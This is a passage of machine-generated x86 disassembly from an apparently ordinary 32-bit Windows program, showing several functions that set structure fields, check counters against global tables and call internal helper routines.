  401729:	66 8b 00             	mov    (%eax),%ax
  40172c:	66 a3 b0 3e 42 00    	mov    %ax,0x423eb0
  401732:	ff 36                	push   (%esi)
  401734:	8b 15 7c 52 41 00    	mov    0x41527c,%edx
  40173a:	e8 d2 3d 00 00       	call   0x405511
  40173f:	ff 34 9d 98 79 41 00 	push   0x417998(,%ebx,4)
  401746:	ff 36                	push   (%esi)
  401748:	e8 dc 3d 00 00       	call   0x405529
  40174d:	ff 35 18 9f 41 00    	push   0x419f18
  401753:	ff 36                	push   (%esi)
  401755:	e8 cf 3d 00 00       	call   0x405529
  40175a:	ff 35 70 76 41 00    	push   0x417670
  401760:	ff 36                	push   (%esi)
  401762:	e8 c2 3d 00 00       	call   0x405529
  401767:	8b 1c 9d c0 71 41 00 	mov    0x4171c0(,%ebx,4),%ebx
  40176e:	83 c4 1c             	add    $0x1c,%esp
  401771:	85 db                	test   %ebx,%ebx
  401773:	74 45                	je     0x4017ba
  401775:	8b c3                	mov    %ebx,%eax
  401777:	e8 58 3e 00 00       	call   0x4055d4
  40177c:	85 c0                	test   %eax,%eax
  40177e:	ff 76 04             	push   0x4(%esi)
  401781:	74 23                	je     0x4017a6
  401783:	8b 14 85 24 9f 41 00 	mov    0x419f24(,%eax,4),%edx
  40178a:	e8 82 3d 00 00       	call   0x405511
  40178f:	8b 45 14             	mov    0x14(%ebp),%eax
  401792:	ff 34 85 98 79 41 00 	push   0x417998(,%eax,4)
  401799:	ff 76 04             	push   0x4(%esi)
  40179c:	e8 88 3d 00 00       	call   0x405529
  4017a1:	83 c4 0c             	add    $0xc,%esp
  4017a4:	eb 08                	jmp    0x4017ae
  4017a6:	8b d3                	mov    %ebx,%edx
  4017a8:	e8 64 3d 00 00       	call   0x405511
  4017ad:	59                   	pop    %ecx
  4017ae:	ff 76 04             	push   0x4(%esi)
  4017b1:	ff 36                	push   (%esi)
  4017b3:	e8 71 3d 00 00       	call   0x405529
  4017b8:	59                   	pop    %ecx
  4017b9:	59                   	pop    %ecx
  4017ba:	a1 b4 7f 42 00       	mov    0x427fb4,%eax
  4017bf:	3b 05 30 50 41 00    	cmp    0x415030,%eax
  4017c5:	7d 47                	jge    0x40180e
  4017c7:	8b 45 14             	mov    0x14(%ebp),%eax
  4017ca:	40                   	inc    %eax
  4017cb:	3b 87 38 4d 41 00    	cmp    0x414d38(%edi),%eax
  4017d1:	7c 3b                	jl     0x40180e
  4017d3:	c6 46 65 0f          	movb   $0xf,0x65(%esi)
  4017d7:	c6 46 66 05          	movb   $0x5,0x66(%esi)
  4017db:	c6 46 6b 00          	movb   $0x0,0x6b(%esi)
  4017df:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  4017e3:	8b bf 28 3d 42 00    	mov    0x423d28(%edi),%edi
  4017e9:	33 db                	xor    %ebx,%ebx
  4017eb:	b8 58 e2 40 00       	mov    $0x40e258,%eax
  4017f0:	8b d7                	mov    %edi,%edx
  4017f2:	43                   	inc    %ebx
  4017f3:	e8 6f 3c 00 00       	call   0x405467
  4017f8:	85 c0                	test   %eax,%eax
  4017fa:	ff 76 08             	push   0x8(%esi)
  4017fd:	75 05                	jne    0x401804
  4017ff:	8b 56 04             	mov    0x4(%esi),%edx
  401802:	eb 02                	jmp    0x401806
  401804:	8b d7                	mov    %edi,%edx
  401806:	e8 06 3d 00 00       	call   0x405511
  40180b:	59                   	pop    %ecx
  40180c:	eb 1a                	jmp    0x401828
  40180e:	8b 46 08             	mov    0x8(%esi),%eax
  401811:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401814:	c6 46 65 02          	movb   $0x2,0x65(%esi)
  401818:	c6 46 66 04          	movb   $0x4,0x66(%esi)
  40181c:	c6 46 6b 00          	movb   $0x0,0x6b(%esi)
  401820:	c6 46 6c 00          	movb   $0x0,0x6c(%esi)
  401824:	66 83 20 00          	andw   $0x0,(%eax)
  401828:	33 c0                	xor    %eax,%eax
  40182a:	89 9e 80 00 00 00    	mov    %ebx,0x80(%esi)
  401830:	40                   	inc    %eax
  401831:	5f                   	pop    %edi
  401832:	eb 02                	jmp    0x401836
  401834:	33 c0                	xor    %eax,%eax
  401836:	5e                   	pop    %esi
  401837:	5b                   	pop    %ebx
  401838:	c9                   	leave
  401839:	c3                   	ret
  40183a:	55                   	push   %ebp
  40183b:	8b ec                	mov    %esp,%ebp
  40183d:	83 e4 f8             	and    $0xfffffff8,%esp
  401840:	51                   	push   %ecx
  401841:	53                   	push   %ebx
  401842:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401845:	33 c0                	xor    %eax,%eax
  401847:	3b d8                	cmp    %eax,%ebx
  401849:	56                   	push   %esi
  40184a:	8b 75 0c             	mov    0xc(%ebp),%esi
  40184d:	57                   	push   %edi
  40184e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401852:	75 3e                	jne    0x401892
  401854:	39 45 18             	cmp    %eax,0x18(%ebp)
  401857:	75 0f                	jne    0x401868
  401859:	a3 b8 7f 42 00       	mov    %eax,0x427fb8
  40185e:	a3 bc 7f 42 00       	mov    %eax,0x427fbc
  401863:	a3 c0 7f 42 00       	mov    %eax,0x427fc0
  401868:	39 45 14             	cmp    %eax,0x14(%ebp)
  40186b:	75 25                	jne    0x401892
  40186d:	88 46 66             	mov    %al,0x66(%esi)
  401870:	88 46 6e             	mov    %al,0x6e(%esi)
  401873:	a1 74 76 41 00       	mov    0x417674,%eax
  401878:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  40187c:	c6 46 68 04          	movb   $0x4,0x68(%esi)
  401880:	c6 46 65 0f          	movb   $0xf,0x65(%esi)
  401884:	c6 46 6a 01          	movb   $0x1,0x6a(%esi)
  401888:	c7 46 60 01 00 00 00 	movl   $0x1,0x60(%esi)
  40188f:	89 46 0c             	mov    %eax,0xc(%esi)
  401892:	8b fb                	mov    %ebx,%edi
  401894:	c1 e7 02             	shl    $0x2,%edi
  401897:	8b 87 f0 2e 42 00    	mov    0x422ef0(%edi),%eax
  40189d:	39 45 14             	cmp    %eax,0x14(%ebp)
  4018a0:	0f 8d d5 00 00 00    	jge    0x40197b
  4018a6:	8b c8                	mov    %eax,%ecx
  4018a8:	6b c9 03             	imul   $0x3,%ecx,%ecx
  4018ab:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  4018ae:	0f 8d c7 00 00 00    	jge    0x40197b
  4018b4:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4018b8:	75 54                	jne    0x40190e
  4018ba:	ff 36                	push   (%esi)
  4018bc:	8b 97 78 76 41 00    	mov    0x417678(%edi),%edx
  4018c2:	e8 4a 3c 00 00       	call   0x405511
  4018c7:	8b 97 68 28 42 00    	mov    0x422868(%edi),%edx
  4018cd:	59                   	pop    %ecx
  4018ce:	ff 76 04             	push   0x4(%esi)
  4018d1:	e8 3b 3c 00 00       	call   0x405511
  4018d6:	a1 c0 7f 42 00       	mov    0x427fc0,%eax
  4018db:	43                   	inc    %ebx
  4018dc:	3b 1c 85 98 9f 41 00 	cmp    0x419f98(,%eax,4),%ebx
  4018e3:	59                   	pop    %ecx
  4018e4:	75 1f                	jne    0x401905
  4018e6:	e8 62 3f 00 00       	call   0x40584d
  4018eb:	8b 8f f0 2e 42 00    	mov    0x422ef0(%edi),%ecx
  4018f1:	49                   	dec    %ecx
  4018f2:	49                   	dec    %ecx
  4018f3:	99                   	cltd
  4018f4:	f7 f9                	idiv   %ecx
  4018f6:	42                   	inc    %edx
  4018f7:	ff 05 c0 7f 42 00    	incl   0x427fc0
  4018fd:	89 15 b8 7f 42 00    	mov    %edx,0x427fb8
  401903:	eb 3a                	jmp    0x40193f
  401905:	83 25 b8 7f 42 00 00 	andl   $0x0,0x427fb8
  40190c:	eb 31                	jmp    0x40193f
  40190e:	ff 76 04             	push   0x4(%esi)
  401911:	8b 16                	mov    (%esi),%edx
  401913:	e8 f9 3b 00 00       	call   0x405511
  401918:	8b 97 78 76 41 00    	mov    0x417678(%edi),%edx
  40191e:	59                   	pop    %ecx
  40191f:	ff 36                	push   (%esi)
  401921:	e8 eb 3b 00 00       	call   0x405511
  401926:	a1 bc 7f 42 00       	mov    0x427fbc,%eax
  40192b:	59                   	pop    %ecx
  40192c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40192f:	03 c1                	add    %ecx,%eax
  401931:	8b 0c 85 80 52 41 00 	mov    0x415280(,%eax,4),%ecx
  401938:	8b 06                	mov    (%esi),%eax
  40193a:	e8 ae 3b 00 00       	call   0x4054ed
  40193f:	8b 0d ac f5 41 00    	mov    0x41f5ac,%ecx
  401945:	e8 47 67 00 00       	call   0x408091
  40194a:	88 46 65             	mov    %al,0x65(%esi)
  40194d:	8b 0d b0 f5 41 00    	mov    0x41f5b0,%ecx
  401953:	e8 39 67 00 00       	call   0x408091
  401958:	88 46 69             	mov    %al,0x69(%esi)
  40195b:	8b 45 14             	mov    0x14(%ebp),%eax
  40195e:	40                   	inc    %eax
  40195f:	39 05 b8 7f 42 00    	cmp    %eax,0x427fb8
  401965:	75 05                	jne    0x40196c
  401967:	33 c0                	xor    %eax,%eax
  401969:	40                   	inc    %eax
  40196a:	eb 04                	jmp    0x401970
  40196c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401970:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  401976:	33 c0                	xor    %eax,%eax
  401978:	40                   	inc    %eax
  401979:	eb 08                	jmp    0x401983
  40197b:	01 05 bc 7f 42 00    	add    %eax,0x427fbc
  401981:	33 c0                	xor    %eax,%eax
  401983:	5f                   	pop    %edi
  401984:	5e                   	pop    %esi
  401985:	5b                   	pop    %ebx
  401986:	8b e5                	mov    %ebp,%esp
  401988:	5d                   	pop    %ebp
  401989:	c3                   	ret
  40198a:	55                   	push   %ebp
  40198b:	8b ec                	mov    %esp,%ebp
  40198d:	51                   	push   %ecx
  40198e:	53                   	push   %ebx
  40198f:	56                   	push   %esi
  401990:	8b 75 0c             	mov    0xc(%ebp),%esi
  401993:	33 db                	xor    %ebx,%ebx
  401995:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  401998:	57                   	push   %edi
  401999:	8b 7d 08             	mov    0x8(%ebp),%edi
  40199c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40199f:	75 16                	jne    0x4019b7
  4019a1:	88 5e 75             	mov    %bl,0x75(%esi)
  4019a4:	88 5e 74             	mov    %bl,0x74(%esi)
  4019a7:	8b 04 bd d8 4d 41 00 	mov    0x414dd8(,%edi,4),%eax
  4019ae:	89 46 70             	mov    %eax,0x70(%esi)
  4019b1:	89 9e 80 00 00 00    	mov    %ebx,0x80(%esi)
  4019b7:	3b fb                	cmp    %ebx,%edi
  4019b9:	75 47                	jne    0x401a02
  4019bb:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  4019be:	75 14                	jne    0x4019d4
  4019c0:	ff 76 04             	push   0x4(%esi)
  4019c3:	ba 64 e2 40 00       	mov    $0x40e264,%edx
  4019c8:	89 1d c4 7f 42 00    	mov    %ebx,0x427fc4
  4019ce:	e8 3e 3b 00 00       	call   0x405511
  4019d3:	59                   	pop    %ecx
  4019d4:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  4019d7:	75 29                	jne    0x401a02
  4019d9:	a1 3c 08 42 00       	mov    0x42083c,%eax
  4019de:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  4019e2:	c6 46 68 07          	movb   $0x7,0x68(%esi)
  4019e6:	88 5e 6b             	mov    %bl,0x6b(%esi)
  4019e9:	88 5e 6c             	mov    %bl,0x6c(%esi)
  4019ec:	c6 46 69 1e          	movb   $0x1e,0x69(%esi)
  4019f0:	c6 46 6a 3c          	movb   $0x3c,0x6a(%esi)
  4019f4:	c6 46 6e 38          	movb   $0x38,0x6e(%esi)
  4019f8:	c7 46 60 09 00 00 00 	movl   $0x9,0x60(%esi)
  4019ff:	89 46 0c             	mov    %eax,0xc(%esi)
  401a02:	83 be 80 00 00 00 01 	cmpl   $0x1,0x80(%esi)
  401a09:	8b 4d 14             	mov    0x14(%ebp),%ecx
  401a0c:	88 4e 74             	mov    %cl,0x74(%esi)
  401a0f:	75 08                	jne    0x401a19
  401a11:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  401a14:	75 03                	jne    0x401a19
  401a16:	fe 46 75             	incb   0x75(%esi)
  401a19:	8b 04 bd a8 06 42 00 	mov    0x4206a8(,%edi,4),%eax
  401a20:	3b c8                	cmp    %eax,%ecx
  401a22:	7d 75                	jge    0x401a99
  401a24:	6b c0 03             	imul   $0x3,%eax,%eax
  401a27:	39 45 18             	cmp    %eax,0x18(%ebp)
  401a2a:	7d 6d                	jge    0x401a99
  401a2c:	3b cb                	cmp    %ebx,%ecx
  401a2e:	75 55                	jne    0x401a85
  401a30:	ff 36                	push   (%esi)
  401a32:	8b 15 04 3c 42 00    	mov    0x423c04,%edx
  401a38:	e8 d4 3a 00 00       	call   0x405511
  401a3d:	ff 34 bd d8 4d 41 00 	push   0x414dd8(,%edi,4)
  401a44:	ff 36                	push   (%esi)
  401a46:	e8 de 3a 00 00       	call   0x405529
  401a4b:	a1 c4 7f 42 00       	mov    0x427fc4,%eax
  401a50:	83 c4 0c             	add    $0xc,%esp
  401a53:	c1 e0 02             	shl    $0x2,%eax
  401a56:	47                   	inc    %edi
  401a57:	3b b8 08 78 41 00    	cmp    0x417808(%eax),%edi
  401a5d:	75 26                	jne    0x401a85
  401a5f:	ff 76 08             	push   0x8(%esi)
  401a62:	8b 90 58 04 42 00    	mov    0x420458(%eax),%edx
  401a68:	e8 a4 3a 00 00       	call   0x405511
  401a6d:	ff 05 c4 7f 42 00    	incl   0x427fc4
  401a73:	59                   	pop    %ecx
  401a74:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401a7b:	c6 46 65 05          	movb   $0x5,0x65(%esi)
  401a7f:	c6 46 66 0a          	movb   $0xa,0x66(%esi)
  401a83:	eb 06                	jmp    0x401a8b
  401a85:	88 5e 66             	mov    %bl,0x66(%esi)
  401a88:	88 5e 65             	mov    %bl,0x65(%esi)
  401a8b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a8e:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  401a94:	33 c0                	xor    %eax,%eax
  401a96:	40                   	inc    %eax
  401a97:	eb 02                	jmp    0x401a9b
  401a99:	33 c0                	xor    %eax,%eax
  401a9b:	5f                   	pop    %edi
  401a9c:	5e                   	pop    %esi
  401a9d:	5b                   	pop    %ebx
  401a9e:	c9                   	leave
  401a9f:	c3                   	ret
  401aa0:	55                   	push   %ebp
  401aa1:	8b ec                	mov    %esp,%ebp
  401aa3:	51                   	push   %ecx
  401aa4:	51                   	push   %ecx
  401aa5:	33 c9                	xor    %ecx,%ecx
  401aa7:	33 c0                	xor    %eax,%eax
  401aa9:	83 3d b4 a4 41 00 01 	cmpl   $0x1,0x41a4b4
  401ab0:	53                   	push   %ebx
  401ab1:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401ab4:	0f 95 c1             	setne  %cl
  401ab7:	39 45 18             	cmp    %eax,0x18(%ebp)
  401aba:	56                   	push   %esi
  401abb:	8b 75 0c             	mov    0xc(%ebp),%esi
  401abe:	57                   	push   %edi
  401abf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401ac2:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401ac5:	75 16                	jne    0x401add
  401ac7:	88 46 75             	mov    %al,0x75(%esi)
  401aca:	88 46 74             	mov    %al,0x74(%esi)
  401acd:	8b 0c 9d c8 2b 42 00 	mov    0x422bc8(,%ebx,4),%ecx
  401ad4:	89 4e 70             	mov    %ecx,0x70(%esi)
  401ad7:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  401add:	3b d8                	cmp    %eax,%ebx
  401adf:	75 61                	jne    0x401b42
  401ae1:	39 45 18             	cmp    %eax,0x18(%ebp)
  401ae4:	75 0f                	jne    0x401af5
  401ae6:	a3 c8 7f 42 00       	mov    %eax,0x427fc8
  401aeb:	a3 cc 7f 42 00       	mov    %eax,0x427fcc
  401af0:	a3 d0 7f 42 00       	mov    %eax,0x427fd0
  401af5:	39 45 14             	cmp    %eax,0x14(%ebp)
  401af8:	75 48                	jne    0x401b42
  401afa:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  401afe:	c6 46 68 04          	movb   $0x4,0x68(%esi)
  401b02:	c6 46 6b 0f          	movb   $0xf,0x6b(%esi)
  401b06:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  401b0a:	8a 0d a4 a4 41 00    	mov    0x41a4a4,%cl
  401b10:	88 4e 65             	mov    %cl,0x65(%esi)
  401b13:	8a 0d a8 a4 41 00    	mov    0x41a4a8,%cl
  401b19:	88 4e 66             	mov    %cl,0x66(%esi)
  401b1c:	8a 0d ac a4 41 00    	mov    0x41a4ac,%cl
  401b22:	88 4e 69             	mov    %cl,0x69(%esi)
  401b25:	8a 0d b0 a4 41 00    	mov    0x41a4b0,%cl
  401b2b:	88 4e 6a             	mov    %cl,0x6a(%esi)
  401b2e:	8b 0d e0 50 41 00    	mov    0x4150e0,%ecx
  401b34:	c6 46 6e 36          	movb   $0x36,0x6e(%esi)
  401b38:	c7 46 60 05 00 00 00 	movl   $0x5,0x60(%esi)
  401b3f:	89 4e 0c             	mov    %ecx,0xc(%esi)
  401b42:	83 be 80 00 00 00 01 	cmpl   $0x1,0x80(%esi)
  401b49:	8b 4d 14             	mov    0x14(%ebp),%ecx
  401b4c:	88 4e 74             	mov    %cl,0x74(%esi)
  401b4f:	75 08                	jne    0x401b59
  401b51:	39 45 10             	cmp    %eax,0x10(%ebp)
  401b54:	75 03                	jne    0x401b59
  401b56:	fe 46 75             	incb   0x75(%esi)
  401b59:	8b fb                	mov    %ebx,%edi
  401b5b:	c1 e7 02             	shl    $0x2,%edi
  401b5e:	8b 87 58 35 42 00    	mov    0x423558(%edi),%eax
  401b64:	3b c8                	cmp    %eax,%ecx
  401b66:	0f 8d c8 00 00 00    	jge    0x401c34
  401b6c:	8b d0                	mov    %eax,%edx
  401b6e:	6b d2 03             	imul   $0x3,%edx,%edx
  401b71:	39 55 18             	cmp    %edx,0x18(%ebp)
  401b74:	0f 8d ba 00 00 00    	jge    0x401c34
  401b7a:	85 c9                	test   %ecx,%ecx
  401b7c:	75 66                	jne    0x401be4
  401b7e:	ff 36                	push   (%esi)
  401b80:	8b 97 c8 2b 42 00    	mov    0x422bc8(%edi),%edx
  401b86:	e8 86 39 00 00       	call   0x405511
  401b8b:	ff 76 04             	push   0x4(%esi)
  401b8e:	8b 97 58 2d 42 00    	mov    0x422d58(%edi),%edx
  401b94:	e8 78 39 00 00       	call   0x405511
  401b99:	a1 d0 7f 42 00       	mov    0x427fd0,%eax
  401b9e:	43                   	inc    %ebx
  401b9f:	3b 1c 85 58 4b 41 00 	cmp    0x414b58(,%eax,4),%ebx
  401ba6:	59                   	pop    %ecx
  401ba7:	59                   	pop    %ecx
  401ba8:	75 31                	jne    0x401bdb
  401baa:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401bae:	74 19                	je     0x401bc9
  401bb0:	e8 98 3c 00 00       	call   0x40584d
  401bb5:	8b 8f 58 35 42 00    	mov    0x423558(%edi),%ecx
  401bbb:	49                   	dec    %ecx
  401bbc:	49                   	dec    %ecx
  401bbd:	99                   	cltd
  401bbe:	f7 f9                	idiv   %ecx
  401bc0:	42                   	inc    %edx
  401bc1:	89 15 c8 7f 42 00    	mov    %edx,0x427fc8
  401bc7:	eb 0a                	jmp    0x401bd3
  401bc9:	c7 05 c8 7f 42 00 01 	movl   $0x1,0x427fc8
  401bd0:	00 00 00 
  401bd3:	ff 05 d0 7f 42 00    	incl   0x427fd0
  401bd9:	eb 3a                	jmp    0x401c15
  401bdb:	83 25 c8 7f 42 00 00 	andl   $0x0,0x427fc8
  401be2:	eb 31                	jmp    0x401c15
  401be4:	ff 76 04             	push   0x4(%esi)
  401be7:	8b 16                	mov    (%esi),%edx
  401be9:	e8 23 39 00 00       	call   0x405511
  401bee:	ff 36                	push   (%esi)
  401bf0:	8b 97 c8 2b 42 00    	mov    0x422bc8(%edi),%edx
  401bf6:	e8 16 39 00 00       	call   0x405511
  401bfb:	a1 cc 7f 42 00       	mov    0x427fcc,%eax
  401c00:	59                   	pop    %ecx
  401c01:	59                   	pop    %ecx
  401c02:	8b 4d 14             	mov    0x14(%ebp),%ecx
  401c05:	03 c1                	add    %ecx,%eax
  401c07:	8b 0c 85 c0 d0 41 00 	mov    0x41d0c0(,%eax,4),%ecx
  401c0e:	8b 06                	mov    (%esi),%eax
  401c10:	e8 d8 38 00 00       	call   0x4054ed
  401c15:	8b 45 14             	mov    0x14(%ebp),%eax
  401c18:	40                   	inc    %eax
  401c19:	39 05 c8 7f 42 00    	cmp    %eax,0x427fc8
  401c1f:	75 05                	jne    0x401c26
  401c21:	33 c0                	xor    %eax,%eax
  401c23:	40                   	inc    %eax
  401c24:	eb 03                	jmp    0x401c29
  401c26:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401c29:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  401c2f:	33 c0                	xor    %eax,%eax
  401c31:	40                   	inc    %eax
  401c32:	eb 08                	jmp    0x401c3c
  401c34:	01 05 cc 7f 42 00    	add    %eax,0x427fcc
  401c3a:	33 c0                	xor    %eax,%eax
  401c3c:	5f                   	pop    %edi
  401c3d:	5e                   	pop    %esi
  401c3e:	5b                   	pop    %ebx
  401c3f:	c9                   	leave
  401c40:	c3                   	ret
  401c41:	55                   	push   %ebp
  401c42:	8b ec                	mov    %esp,%ebp
  401c44:	b8 9c 31 00 00       	mov    $0x319c,%eax
  401c49:	e8 62 b9 00 00       	call   0x40d5b0
  401c4e:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c51:	56                   	push   %esi
  401c52:	33 c9                	xor    %ecx,%ecx
  401c54:	57                   	push   %edi
  401c55:	33 ff                	xor    %edi,%edi
  401c57:	41                   	inc    %ecx
  401c58:	33 f6                	xor    %esi,%esi
  401c5a:	89 7d f8             	mov    %edi,-0x8(%ebp)
  401c5d:	40                   	inc    %eax
  401c5e:	eb 1c                	jmp    0x401c7c
  401c60:	81 f9 00 00 01 00    	cmp    $0x10000,%ecx
  401c66:	73 18                	jae    0x401c80
  401c68:	85 0d 24 9f 41 00    	test   %ecx,0x419f24
  401c6e:	74 01                	je     0x401c71
  401c70:	46                   	inc    %esi
  401c71:	85 4d 08             	test   %ecx,0x8(%ebp)
  401c74:	74 01                	je     0x401c77
  401c76:	48                   	dec    %eax
  401c77:	ff 45 f8             	incl   -0x8(%ebp)
  401c7a:	03 c9                	add    %ecx,%ecx
  401c7c:	3b c7                	cmp    %edi,%eax
  401c7e:	75 e0                	jne    0x401c60
  401c80:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401c83:	3b cf                	cmp    %edi,%ecx
  401c85:	75 0c                	jne    0x401c93
  401c87:	66 c7 45 d0 30 00    	movw   $0x30,-0x30(%ebp)
  401c8d:	66 89 7d d2          	mov    %di,-0x2e(%ebp)
  401c91:	eb 08                	jmp    0x401c9b
  401c93:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401c96:	e8 5e 3a 00 00       	call   0x4056f9
  401c9b:	8b 55 14             	mov    0x14(%ebp),%edx
  401c9e:	8d 85 64 de ff ff    	lea    -0x219c(%ebp),%eax
  401ca4:	50                   	push   %eax
  401ca5:	e8 67 38 00 00       	call   0x405511
  401caa:	59                   	pop    %ecx
  401cab:	8b 4d 18             	mov    0x18(%ebp),%ecx
  401cae:	3b cf                	cmp    %edi,%ecx
  401cb0:	74 0b                	je     0x401cbd
  401cb2:	8d 85 64 de ff ff    	lea    -0x219c(%ebp),%eax
  401cb8:	e8 30 38 00 00       	call   0x4054ed
  401cbd:	8b 14 b5 0c 37 42 00 	mov    0x42370c(,%esi,4),%edx
  401cc4:	53                   	push   %ebx
  401cc5:	e8 47 38 00 00       	call   0x405511
  401cca:	8b 75 f8             	mov    -0x8(%ebp),%esi
  401ccd:	83 fe 01             	cmp    $0x1,%esi
  401cd0:	59                   	pop    %ecx
  401cd1:	75 32                	jne    0x401d05
  401cd3:	8b 4d 20             	mov    0x20(%ebp),%ecx
  401cd6:	3b cf                	cmp    %edi,%ecx
  401cd8:	75 0c                	jne    0x401ce6
  401cda:	66 c7 45 a8 30 00    	movw   $0x30,-0x58(%ebp)
  401ce0:	66 89 7d aa          	mov    %di,-0x56(%ebp)
  401ce4:	eb 08                	jmp    0x401cee
  401ce6:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401ce9:	e8 0b 3a 00 00       	call   0x4056f9
  401cee:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401cf1:	50                   	push   %eax
  401cf2:	53                   	push   %ebx
  401cf3:	e8 31 38 00 00       	call   0x405529
  401cf8:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401cfb:	50                   	push   %eax
  401cfc:	53                   	push   %ebx
  401cfd:	e8 27 38 00 00       	call   0x405529
  401d02:	83 c4 10             	add    $0x10,%esp
  401d05:	83 fe 05             	cmp    $0x5,%esi
  401d08:	0f 85 f9 00 00 00    	jne    0x401e07
  401d0e:	33 c0                	xor    %eax,%eax
  401d10:	e8 52 55 00 00       	call   0x407267
  401d15:	8b c8                	mov    %eax,%ecx
  401d17:	3b cf                	cmp    %edi,%ecx
  401d19:	75 0c                	jne    0x401d27
  401d1b:	66 c7 45 a8 30 00    	movw   $0x30,-0x58(%ebp)
  401d21:	66 89 7d aa          	mov    %di,-0x56(%ebp)
  401d25:	eb 08                	jmp    0x401d2f
  401d27:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401d2a:	e8 ca 39 00 00       	call   0x4056f9
  401d2f:	8b 0d b0 fd 41 00    	mov    0x41fdb0,%ecx
  401d35:	3b cf                	cmp    %edi,%ecx
  401d37:	75 0c                	jne    0x401d45
  401d39:	66 c7 45 80 30 00    	movw   $0x30,-0x80(%ebp)
  401d3f:	66 89 7d 82          	mov    %di,-0x7e(%ebp)
  401d43:	eb 08                	jmp    0x401d4d
  401d45:	8d 45 80             	lea    -0x80(%ebp),%eax
  401d48:	e8 ac 39 00 00       	call   0x4056f9
  401d4d:	8b 0d 78 52 41 00    	mov    0x415278,%ecx
  401d53:	3b cf                	cmp    %edi,%ecx
  401d55:	75 12                	jne    0x401d69
  401d57:	66 c7 85 54 ff ff ff 	movw   $0x30,-0xac(%ebp)
  401d5e:	30 00 
  401d60:	66 89 bd 56 ff ff ff 	mov    %di,-0xaa(%ebp)
  401d67:	eb 0b                	jmp    0x401d74
  401d69:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  401d6f:	e8 85 39 00 00       	call   0x4056f9
  401d74:	8d bd 64 de ff ff    	lea    -0x219c(%ebp),%edi
  401d7a:	8d 95 64 ce ff ff    	lea    -0x319c(%ebp),%edx
  401d80:	e8 c5 53 00 00       	call   0x40714a
  401d85:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401d88:	50                   	push   %eax
  401d89:	53                   	push   %ebx
  401d8a:	e8 9a 37 00 00       	call   0x405529
  401d8f:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401d92:	50                   	push   %eax
  401d93:	53                   	push   %ebx
  401d94:	e8 90 37 00 00       	call   0x405529
  401d99:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  401d9c:	83 c4 10             	add    $0x10,%esp
  401d9f:	85 ff                	test   %edi,%edi
  401da1:	74 28                	je     0x401dcb
  401da3:	8d 95 64 ee ff ff    	lea    -0x119c(%ebp),%edx
  401da9:	e8 9c 53 00 00       	call   0x40714a
  401dae:	68 7c e2 40 00       	push   $0x40e27c
  401db3:	53                   	push   %ebx
  401db4:	e8 70 37 00 00       	call   0x405529
  401db9:	8d 85 64 ee ff ff    	lea    -0x119c(%ebp),%eax
  401dbf:	50                   	push   %eax
  401dc0:	53                   	push   %ebx
  401dc1:	e8 63 37 00 00       	call   0x405529
  401dc6:	83 c4 10             	add    $0x10,%esp
  401dc9:	eb 0d                	jmp    0x401dd8
  401dcb:	68 a8 e2 40 00       	push   $0x40e2a8
  401dd0:	53                   	push   %ebx
  401dd1:	e8 53 37 00 00       	call   0x405529
  401dd6:	59                   	pop    %ecx
  401dd7:	59                   	pop    %ecx
  401dd8:	8d 85 64 ce ff ff    	lea    -0x319c(%ebp),%eax
  401dde:	50                   	push   %eax
  401ddf:	53                   	push   %ebx
  401de0:	e8 44 37 00 00       	call   0x405529
  401de5:	8d 45 80             	lea    -0x80(%ebp),%eax
  401de8:	50                   	push   %eax
  401de9:	53                   	push   %ebx
  401dea:	e8 3a 37 00 00       	call   0x405529
  401def:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  401df5:	50                   	push   %eax
  401df6:	53                   	push   %ebx
  401df7:	e8 2d 37 00 00       	call   0x405529
  401dfc:	83 c4 18             	add    $0x18,%esp
  401dff:	33 c0                	xor    %eax,%eax
  401e01:	40                   	inc    %eax
  401e02:	e9 09 04 00 00       	jmp    0x402210
  401e07:	83 fe 06             	cmp    $0x6,%esi
  401e0a:	0f 85 40 01 00 00    	jne    0x401f50
  401e10:	33 c0                	xor    %eax,%eax
  401e12:	e8 50 54 00 00       	call   0x407267
  401e17:	8b c8                	mov    %eax,%ecx
  401e19:	3b cf                	cmp    %edi,%ecx
  401e1b:	75 12                	jne    0x401e2f
  401e1d:	66 c7 85 54 ff ff ff 	movw   $0x30,-0xac(%ebp)
  401e24:	30 00 
  401e26:	66 89 bd 56 ff ff ff 	mov    %di,-0xaa(%ebp)
  401e2d:	eb 0b                	jmp    0x401e3a
  401e2f:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
